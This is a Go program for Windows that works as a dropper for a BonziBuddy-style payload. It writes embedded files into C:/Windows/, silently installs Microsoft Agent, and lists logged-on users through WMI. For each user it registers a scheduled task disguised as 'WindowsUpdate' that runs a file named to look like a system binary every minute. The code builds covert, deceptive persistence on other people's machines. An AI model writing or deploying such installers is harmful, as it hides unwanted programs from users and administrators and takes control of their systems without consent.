//go:build windows
// +build windows

package main

import (
	"embed"
	"fmt"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"strings"

	"github.com/stackexchange/wmi"
	"golang.org/x/sys/windows"
)

//go:embed msagent/* Utilities/*
var f embed.FS

type Win32_LoggedOnUser struct {
	Antecedent string
}

var (
	user32DLL            = windows.NewLazyDLL("secur32.dll")
	procTerminalSessions = user32DLL.NewProc("LsaEnumerateLogonSessions")
)

func extractFromQuotes(input string, start string, end string) (result string) {

	startChar := 0
	endChar := 0
	startRune := []rune(start)
	endRune := []rune(end)

	for i, ch := range input {
		if ch == startRune[0] {
			startChar = i + 1
			break
		}
	}

	for i, ch := range input {
		if ch == endRune[0] && i > startChar {
			endChar = i - 1
			break
		}
	}

	for i, ch := range input {
		if i > endChar {
			break
		}

		if i < startChar {
			continue
		}

		result += string(ch)

	}
	return

}

func main() {

	// Parent dirs defined here:
	bonzParent := "C:/Windows/"
	msAgentParent := "C:/Windows/"

	//
	// Unpack Files
	//

	// Create the parent dirs
	err := os.Mkdir(bonzParent+"Utilities", 0755)
	if err != nil {
		log.Printf("darn: %v", err)
	}
	err = os.Mkdir(msAgentParent+"msagent", 0755)
	if err != nil {
		log.Printf("darn: %v", err)
	}

	// Walk through the embedded files
	fs.WalkDir(f, ".", func(path string, d fs.DirEntry, err error) error {

		// If it is from the Bonzi folder, put it in the bonz path
		if strings.Contains(path, "Utilities") {

			fullPath := bonzParent + path

			// Check to make sure it doesn't exist yet
			if _, err := os.Stat(fullPath); os.IsNotExist(err) {

				// If it is a directory create it
				if d.IsDir() {
					os.MkdirAll(fullPath, 0700)
				} else {

					// Otherwise read the bytes
					fileBytes, err := f.ReadFile(path)
					if err != nil {
						log.Printf("rip: %v", err)
					}

					// Write the file
					if err := os.WriteFile(fullPath, fileBytes, 0666); err != nil {
						log.Printf("write error :C %v", err)
					}
				}
			}
		} else {

			// Otherwise it is msagent

			fullPath := msAgentParent + path

			// Check to make sure it doesn't exist yet
			if _, err := os.Stat(fullPath); os.IsNotExist(err) {

				// If it is a directory create it
				if d.IsDir() {
					os.MkdirAll(fullPath, 0700)
				} else {

					// Otherwise read the bytes
					fileBytes, err := f.ReadFile(path)
					if err != nil {
						log.Printf("rip: %v", err)
					}

					// Write the file
					if err := os.WriteFile(fullPath, fileBytes, 0666); err != nil {
						log.Printf("write error :C %v", err)
					}
				}
			}
		}

		return nil
	})

	//
	// Install bonzibuddy
	//

	// Get currently logged in users

	var users []Win32_LoggedOnUser
	UserQuery := wmi.CreateQuery(&users, "")

	err = wmi.Query(UserQuery, &users)
	if err != nil {
		log.Fatal(err)
	}

	userList := []string{}

	for i, v := range users {
		println(i, v.Antecedent)
		antecedentTokenized := strings.Split(v.Antecedent, "=")
		tempUser := extractFromQuotes(antecedentTokenized[1], "\"", "\"") + "\\" + extractFromQuotes(antecedentTokenized[2], "\"", "\"")

		result := true
		for i, _ := range userList {
			if userList[i] == tempUser {
				result = false
			}
		}
		if result {
			userList = append(userList, tempUser)
		}

	}

	// Install msagent
	cmd := exec.Command(bonzParent+"Utilities/Runtimes/MSAGENT.EXE", "/q")

	err = cmd.Run()
	if err != nil {
		panic(err)
	}

	// Create scheduled task
	for i, _ := range userList {
		fmt.Println(userList[i])
		cmd = exec.Command("schtasks", "/ru", userList[i], "/IT", "/create", "/sc", "minute", "/mo", "1", "/tn", ("WindowsUpdate" + fmt.Sprint(i)), "/tr", bonzParent+"Utilities/wsappx.exe")

		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
		}
	}

}
